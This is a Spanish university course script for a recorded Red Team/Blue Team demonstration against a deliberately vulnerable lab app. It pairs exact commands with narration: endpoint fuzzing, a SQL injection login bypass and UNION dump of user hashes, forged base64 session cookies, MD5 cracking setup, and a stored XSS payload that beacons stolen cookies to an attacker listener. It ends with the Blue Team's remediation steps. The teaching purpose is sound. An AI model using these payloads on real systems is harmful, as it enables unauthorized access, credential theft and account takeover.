# 🎬 Guión Técnico Escénico y Narrativo — Video de Defensa (Fases I y II)

> **Universidad Católica Andrés Bello · Facultad de Ingeniería · Ciberseguridad**  
> **Proyecto:** VulnApp — Simulación Red Team / Blue Team  
> **Formato:** Guión de Acción Simultánea (Comando exacto + Lo que dices en ese instante)

---

# 🟢 FASE I: RECONOCIMIENTO (RECONNAISSANCE)

---

### PASO 1.1: Fuzzing de endpoints con `ffuf`

* 🖥️ **Acción Visual:** Abre la terminal de Kali Linux y escribe el comando `ffuf`.
* ⌨️ **Comando a escribir:**
  ```bash
  ffuf -u http://192.168.56.20:4000/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,401,403,405 -t 10
  ```
* 🗣️ **Lo que dice Maurizio Brazón (Red Team - SQLi):**
  > *"Saludos. Iniciamos la demostración del Red Team con la Fase I: Reconocimiento. Sin recurrir a escáneres masivos de vulnerabilidades, utilizamos la herramienta `ffuf` para realizar un fuzzing controlado sobre el servidor en `192.168.56.20:4000`. Como ven en pantalla, las respuestas HTTP descubren con precisión los endpoints activos de la API: `/api/login`, `/api/register`, `/api/search` y `/api/message`."*

---

### PASO 1.2: Registro de un usuario legítimo

* 🖥️ **Acción Visual:** En la misma terminal, escribes la petición `curl` para registrar un usuario de pruebas.
* ⌨️ **Comando a escribir:**
  ```bash
  curl -i -X POST http://192.168.56.20:4000/api/register \
       -H "Content-Type: application/json" \
       -d '{"username": "usuario_prueba", "password": "password123"}'
  ```
* 🗣️ **Lo que dice Maurizio Brazón (Red Team - SQLi):**
  > *"Para estudiar la aplicación sin atacarla aún, interactuamos legítimamente con `/api/register` creando un usuario de pruebas. El backend en Express nos confirma con un código `HTTP 201 Created` que la cuenta fue registrada exitosamente."*

---

### PASO 1.3: Login legítimo e inspección de la cabecera `Set-Cookie`

* 🖥️ **Acción Visual:** Ecribes el comando de login con la opción `-i` para ver cabeceras HTTP. Cuando sale la respuesta, resaltas con el ratón la línea `Set-Cookie`.
* ⌨️ **Comando a escribir:**
  ```bash
  curl -i -X POST http://192.168.56.20:4000/api/login \
       -H "Content-Type: application/json" \
       -d '{"username": "usuario_prueba", "password": "password123"}'
  ```
* 🗣️ **Lo que dice César Sánchez (Red Team - Cookie Tampering):**
  > *"Ahora nos autenticamos enviando una petición POST a `/api/login`. Al incluir la bandera `-i`, capturamos la respuesta del servidor donde resaltamos la cabecera `Set-Cookie`. Vemos que el servidor nos asigna una cookie de sesión llamada `session` con un valor codificado."*

---

### PASO 1.4: Decodificación de la Cookie e identificación de CWE-311 y CWE-345

* 🖥️ **Acción Visual:** Copias el texto de la cookie y lo pasas por `base64 -d`.
* ⌨️ **Comando a escribir:**
  ```bash
  echo "eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoidXN1YXJpb19wcnVlYmEiLCJyb2xlIjoidXNlciJ9" | base64 -d
  ```
* 🗣️ **Lo que dice César Sánchez (Red Team - Cookie Tampering):**
  > *"Al decodificar la cookie con `base64 -d`, obtenemos el objeto JSON en texto plano. Esto nos permite diagnosticar dos fallas de la categoría **OWASP A04:2025 Fallas Criptográficas**: primero, **CWE-311 (Falta de Cifrado)**, ya que los datos de sesión viajan en Base64 sin cifrar; y segundo, **CWE-345 (Verificación Insuficiente de Autenticidad)**, pues la cookie no incluye una firma digital ni token HMAC que garantice su integridad."*

---

# 🟡 FASE II: ARMAMENTO (WEAPONIZATION)

---

### PASO 2.1: Creación del payload de Inyección SQL (`payload_sqli.json`)

* 🖥️ **Acción Visual:** En la terminal de Kali, creas directamente el archivo JSON con el payload de SQLi y lo verificas.
* ⌨️ **Comando a escribir:**
  ```bash
  echo "{\"username\": \"' OR 1=1 /*\", \"password\": \"x\"}" > payload_sqli.json
  cat payload_sqli.json
  ```
* 🗣️ **Lo que dice Maurizio Brazón (Red Team - SQLi):**
  > *"Pasamos a la Fase II: Armamento. Para la vulnerabilidad **OWASP A05:2025 Inyección (CWE-89)**, preparamos el archivo `payload_sqli.json`. El backend procesa la consulta de autenticación concatenando directamente el parámetro `username`. Construimos un payload de inyección SQL `' OR 1=1 /*` que inyecta una tautología lógica. El delimitador `/*` (comentario en bloque) anula la verificación sintáctica restante. Al procesarse, la cláusula `WHERE` se evalúa siempre como verdadera (`TRUE`), neutralizando la verificación de contraseña y permitiendo el acceso no autorizado como primer usuario del sistema."*

---

### PASO 2.2: Creación y codificación del payload de Cookie Tampering (`cookie_adulterada.txt`)

* 🖥️ **Acción Visual:** Creas la cookie falsificada localmente en Kali modificando el `userId` a `1` y la guardas en un archivo.
* ⌨️ **Comando a escribir:**
  ```bash
  echo -n '{"userId":1,"username":"usuario_prueba","role":"user"}' | base64 -w 0 > cookie_adulterada.txt
  cat cookie_adulterada.txt
  ```
* 🗣️ **Lo que dice César Sánchez (Red Team - Cookie Tampering):**
  > *"Para explotar **CWE-345**, construimos el arma de suplantación de identidad. Alteramos el objeto JSON cambiando el `userId` del usuario estándar `2` al identificador `1`, correspondiente al primer usuario de la base de datos. Lo codificamos a Base64 con la CLI y guardamos el resultado en `cookie_adulterada.txt`, listo para inyectarse en la cabecera HTTP."*

---

### PASO 2.3: Preparación del entorno de cracking MD5 con Hashcat

* 🖥️ **Acción Visual:** Creas el archivo del hash de prueba y verificas la lista de contraseñas.
* ⌨️ **Comando a escribir:**
  ```bash
  echo "0192023a7bbd73250516f069df18b500" > target_hash.txt
  ls -lh /usr/share/wordlists/rockyou.txt 2>/dev/null || ls -lh /usr/share/wordlists/rockyou.txt.gz
  ```
* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
  > *"Para vulnerar las credenciales que exfiltraremos de la base de datos, armamos el entorno de análisis sobre **CWE-327 (MD5 Obsoleto)**, **CWE-759 (MD5 sin Sal)** y **CWE-916 (Esfuerzo Criptográfico Insuficiente)**. Guardamos el hash de prueba en `target_hash.txt` y verificamos la disponibilidad de nuestro diccionario en Kali Linux para ser procesado con Hashcat en modo `-m 0`."*

---

### PASO 2.4: Creación del payload de Stored XSS (`payload_xss.json`)

* 🖥️ **Acción Visual:** Creas el archivo JSON con el script XSS usando un comando de una sola línea.
* ⌨️ **Comandos a escribir:**
  ```bash
  cat << 'EOF' > payload_xss.json
  {"receiverId": 1, "content": "<img src=x onerror=\"new Image().src='http://192.168.56.10:8888/?c='+btoa(document.cookie)\">"}
  EOF
  cat payload_xss.json
  ```
* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
  > *"Finalmente, para la vulnerabilidad **OWASP A05:2025 Stored XSS (CWE-79 y CWE-116)**, creamos el archivo `payload_xss.json`. Como el navegador bloquea etiquetas `<script>` inyectadas a través de `innerHTML`, diseñamos una etiqueta `<img>` rota que, al fallar, ejecuta el evento `onerror` y enviará asíncronamente la cookie de la víctima usando un `Image Beacon` hacia nuestro listener C2 en `192.168.56.10:8888`, evadiendo así las políticas CORS. Con esto completamos el armamento de nuestros vectores."*

---

# 🔴 FASE III: ENTREGA (DELIVERY)

---

### PASO 3.1: Entrega del vector SQL Injection en `/api/login`

* 🖥️ **Acción Visual:** En la terminal de Kali Linux, sobrescribes el archivo `payload_sqli.json` para asegurar el comentario sintáctico correcto y ejecutas la transmisión mediante `curl`.
* ⌨️ **Comandos a escribir:**
  ```bash
  cat << 'EOF' > payload_sqli.json
  {
    "username": "' OR 1=1 /*",
    "password": "x"
  }
  EOF
  curl -i -X POST http://192.168.56.20:4000/api/login \
       -H "Content-Type: application/json" \
       -d @payload_sqli.json
  ```
* 🗣️ **Lo que dice Maurizio Brazón (Red Team - SQLi):**
  > *"Iniciamos la Fase III: Entrega. La transmisión de nuestros vectores maliciosos se orquesta de manera manual, eludiendo escáneres.*  
  > *En este primer paso, ajustamos nuestro vector de Inyección SQL para usar el delimitador `/*` (comentario en bloque) y lo enviamos hacia `/api/login`. Al llegar al servidor, el middleware `express.json()` lo procesa e inyecta directamente en la consulta del backend sin sanitización, logrando el bypass de autenticación instantáneo y emitiendo una cookie válida de administrador."*

---

### PASO 3.2: Entrega de la Cookie Adulterada en `/api/profile` (Cookie Tampering)

* 🖥️ **Acción Visual:** Lees el contenido de `cookie_adulterada.txt` y lo inyectas directamente dentro de la cabecera HTTP `Cookie: session=...` al consultar `/api/profile`.
* ⌨️ **Comando a escribir:**
  ```bash
  COOKIE_VAL=$(cat cookie_adulterada.txt) && curl -i -X GET http://192.168.56.20:4000/api/profile \
       -H "Cookie: session=$COOKIE_VAL"
  ```
* 🗣️ **Lo que dice César Sánchez (Red Team - Cookie Tampering):**
  > *"Continuando con la entrega, inyectamos la cookie adulterada (donde suplantamos el `userId` por `1`) directamente dentro de las cabeceras HTTP de la petición GET hacia `/api/profile`.*  
  > *Como el servidor carece de verificación de integridad HMAC (CWE-345), la cabecera es procesada limpiamente por el backend, demostrando la entrega exitosa del vector de suplantación y confirmando nuestra identidad como administrador."*

---

### PASO 3.3: Entrega del payload Stored XSS en `/api/message`

* 🖥️ **Acción Visual:** Aseguras el formato JSON escapando las comillas dobles internas del script XSS y lo transmites mediante una petición POST al endpoint `/api/message`.
* ⌨️ **Comandos a escribir:**
  ```bash
  cat << 'EOF' > payload_xss.json
  {"receiverId": 1, "content": "<img src=x onerror=\"new Image().src='http://192.168.56.10:8888/?c='+btoa(document.cookie)\">"}
  EOF
  curl -i -X POST http://192.168.56.20:4000/api/message \
       -H "Content-Type: application/json" \
       -H "Cookie: session=$COOKIE_VAL" \
       -d @payload_xss.json
  ```
* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
  > *"Finalmente, entregamos el vector de Stored XSS transmitiendo el cuerpo JSON hacia el endpoint de mensajería interna `/api/message`.*  
  > *La etiqueta `<script>` con el código malicioso viaja directamente en la propiedad `content`. El servidor procesa y almacena este contenido en la base de datos sin aplicar filtros de entrada ni escape de caracteres (CWE-79), completando exitosamente la entrega de todos nuestros vectores de ataque."*

---

# 🔴 FASE IV: EXPLOTACIÓN (EXPLOITATION)

---

### PASO 4.1: Explotación de Inyección SQL (CWE-89) en el Backend Node.js / SQLite

* 🖥️ **Acción Visual:** Se observa en la terminal la respuesta `HTTP 200 OK` con la cookie de sesión emitida tras el bypass en `/api/login`, y la ejecución de la consulta `UNION SELECT` en el endpoint `/api/search`.
* ⌨️ **Comando a escribir:**
  ```bash
  curl -i -X POST http://192.168.56.20:4000/api/search \
       -H "Content-Type: application/json" \
       -H "Cookie: session=$COOKIE_VAL" \
       -d '{"query": "'\'' UNION SELECT username, password, email FROM users--"}'
  ```
* 🗣️ **Lo que dice Maurizio Brazón (Red Team - SQLi):**
  > *"Pasamos a la Fase IV: Explotación. En esta etapa se materializan las fallas estructurales derivadas de la programación insegura.*  
  > *Respecto a **CWE-89 (Inyección SQL)**, el backend desarrollado en Node.js concatena los payloads inyectados directamente dentro de las directivas de SQLite sin emplear parametrización ni consultas preparadas. Esto altera de forma directa el árbol de ejecución lógico del motor relacional `better-sqlite3`.*  
  > *Como pueden apreciar en pantalla, al ejecutar la búsqueda inyectada en `/api/search`, logramos forzar al motor de base de datos a retornar los registros completos de la tabla de usuarios, incluyendo nombres, correos y hashes de contraseñas."*

---

### PASO 4.2: Explotación de la Cookie Adulterada por Falta de HMAC (CWE-345 y CWE-311)

* 🖥️ **Acción Visual:** Muestras la respuesta `HTTP 200 OK` del endpoint `/api/profile` devolviendo la información completa del usuario `id: 1` (`admin@vulnapp.local`).
* ⌨️ **Comando a escribir:**
  ```bash
  curl -i -X GET http://192.168.56.20:4000/api/profile \
       -H "Cookie: session=$COOKIE_VAL"
  ```
* 🗣️ **Lo que dice César Sánchez (Red Team - Cookie Tampering):**
  > *"En relación con **CWE-345 (Verificación Insuficiente de Autenticidad)** y **CWE-311 (Falta de Cifrado)**, el middleware de autorización del servidor valida a ciegas el estado de la sesión presente en la cookie.*  
  > *Al enviar la cookie adulterada en Base64, el servidor lee el objeto JSON sin verificar su integridad, debido a la ausencia total de un Código de Autenticación de Mensajes basado en Hash (HMAC).*  
  > *Como observan en el cuerpo de la respuesta, el backend procesa la petición y nos otorga acceso completo a los datos del usuario ID 1 (`admin`), confirmando la materialización de la falla arquitectónica en la gestión de sesiones."*

---

# 🔴 FASE V: INSTALACIÓN / PERSISTENCIA (INSTALLATION)

---

### PASO 5.1: Persistencia del Vector Stored XSS en la Base de Datos (CWE-79 y CWE-116)

* 🖥️ **Acción Visual:** Muestras la terminal ejecutando una consulta `sqlite3` directa a la base de datos `vulnapp.db` evidenciando que el script malicioso se guardó textualmente.
* ⌨️ **Comando a escribir:**
  ```bash
  sqlite3 vulnapp.db "SELECT id, content FROM messages WHERE id=(SELECT max(id) FROM messages);"
  ```
  *(Nota para el video: Asegúrate de estar posicionado en el directorio `vulnapp/vulnerable` antes de ejecutar el comando, ya que ahí se encuentra la base de datos real con los registros inyectados)*
* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
  > *"Entramos en la Fase V: Instalación. En esta etapa, consolidamos la persistencia dentro del entorno vulnerado.*  
  > *Como pueden observar al consultar directamente el archivo de la base de datos relacional, el payload XSS que entregamos en la fase anterior se ha inscrito de manera definitiva y permanente.*  
  > *La total ausencia de codificación de salida o sanitización en el backend permite este almacenamiento letal. Más grave aún, el uso de la propiedad insegura `innerHTML` en el frontend (incurriendo en **CWE-79** y **CWE-116**) garantiza que este código parasitario se descargue del servidor y se despliegue recurrentemente, ejecutándose en el navegador de cualquier víctima legítima que interactúe con el panel de mensajes del sistema."*

---

# 🔴 FASE VI: COMANDO Y CONTROL (C2)

---

### PASO 6.1: Establecimiento del Canal de Exfiltración Pasivo

* 🖥️ **Acción Visual:** Se muestra en la pantalla (preferiblemente dividida) una terminal en Kali Linux ejecutando un servidor HTTP en el puerto 8888 mediante Python, y en otra ventana el momento en que se captura una cookie robada cuando una víctima navega por el sistema.
* ⌨️ **Comando a escribir (en Kali):**
  ```bash
  python3 -m http.server 8888
  ```
* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
  > *"Avanzamos a la Fase VI: Comando y Control (C2). Aquí establecemos un canal de exfiltración pasivo.*  
  > *Levantamos un servidor de escucha en nuestra máquina atacante Kali Linux mediante Python. El Worm XSS que dejamos incrustado en la base de datos utiliza el Event Handler `onerror` de una etiqueta de imagen rota para realizar un bypass de las restricciones de `innerHTML`.*  
  > *Este Image Beacon obliga al navegador vulnerado a enviar peticiones automatizadas, entregando las cookies de sesión robadas directamente a nuestro control de manera silenciosa, efectiva, y evadiendo las políticas de CORS de los navegadores modernos."*

---

# 🔴 FASE VII: ACCIONES SOBRE LOS OBJETIVOS (ACTIONS ON OBJECTIVES)

---

### PASO 7.1: Vulneración Absoluta y Cierre de la Fase Ofensiva

* 🖥️ **Acción Visual:** Se muestran brevemente en pantalla los resultados combinados de la intrusión: los hashes extraídos (fase 4), la captura de cookies (fase 6) y el acceso a la cuenta del administrador.
* 🗣️ **Lo que dice Eduard Velasco (Red Team - Crypto & XSS):**
  > *"Finalmente, entramos en la Fase VII: Acciones sobre los Objetivos. El ciclo culmina con la vulneración absoluta de los pilares de Confidencialidad, Integridad y Disponibilidad.*  
  > *Como equipo ofensivo (Red Team), logramos la evasión del mecanismo de autenticación y la extracción íntegra de la base de datos, exponiendo contraseñas almacenadas bajo un algoritmo obsoleto, evidenciando **CWE-759** y **CWE-916**.*  
  > *Paralelamente, concretamos un Secuestro de Cuentas a escala global (Account Takeover), logrando acceso irrestricto y cumpliendo exitosamente con los objetivos destructivos de la intrusión. Finalizamos la demostración del ataque y cedemos el paso a la respuesta de incidentes."*

---

---

# 🔵 FASE VIII: REMEDIACIÓN Y DEFENSA (BLUE TEAM)

---

### PASO 8.1: Presentación de los Parches de Seguridad (Defensa en Profundidad)

* 🖥️ **Acción Visual:** Muestras en pantalla dividida o de manera secuencial los fragmentos de código del archivo `secure/server.js` o las diapositivas de la presentación donde se aprecian las correcciones.
* 🗣️ **Lo que dice César Reyes (Blue Team - SQLi):**
  > *"Habiendo demostrado el impacto crítico de las vulnerabilidades, asumimos el rol defensivo (Blue Team) para aplicar las medidas de remediación y asegurar la plataforma basándonos en las mejores prácticas de la industria y mitigando el OWASP Top 10:*  
  >  
  > *1. **Mitigación de Inyección SQL (CWE-89):** Reemplazamos la concatenación insegura de cadenas por consultas preparadas (Prepared Statements) utilizando la API paramétrica de `better-sqlite3`. Esto asegura que el motor de la base de datos restrinja las entradas estrictamente a literales de datos, neutralizando cualquier intento de alterar el Árbol de Sintaxis Abstracta (AST)."*  

* 🗣️ **Lo que dice Sebastián Cova (Blue Team - XSS & Crypto):**
  > *"2. **Defensa contra XSS (CWE-79 / CWE-116):** Para el XSS Almacenado, implementamos la sanitización de salida (Output Encoding) y abandonamos el uso de la propiedad insegura `innerHTML` en el frontend, reemplazándola por `textContent`, lo cual obliga al navegador a tratar los datos estrictamente como texto plano y no como código ejecutable.*  
  >  
  > *3. **Autenticidad de Sesiones (CWE-345):** Para prevenir el Cookie Tampering y el Secuestro de Sesión, implementamos un Código de Autenticación de Mensajes basado en Hash (HMAC) utilizando `crypto.createHmac` con una clave secreta fuerte del lado del servidor. Esto garantiza la integridad criptográfica de la sesión."*  

* 🗣️ **Lo que dice Marco Cegarra (Blue Team - Crypto):**
  > *"4. **Protección de Credenciales (CWE-327 / CWE-759):** Finalmente, erradicamos el uso del algoritmo obsoleto MD5 y lo reemplazamos por algoritmos robustos de derivación de claves como **scrypt** o **Argon2**, acompañados de un 'Salt' único generado criptográficamente, haciendo inviables los ataques de diccionario y el uso de Rainbow Tables.*  
  >  
  > *Con la implementación de estas capas defensivas, la plataforma queda blindada contra los vectores de ataque explotados, garantizando de nuevo la Confidencialidad, Integridad y Disponibilidad del sistema. Muchas gracias."*

---
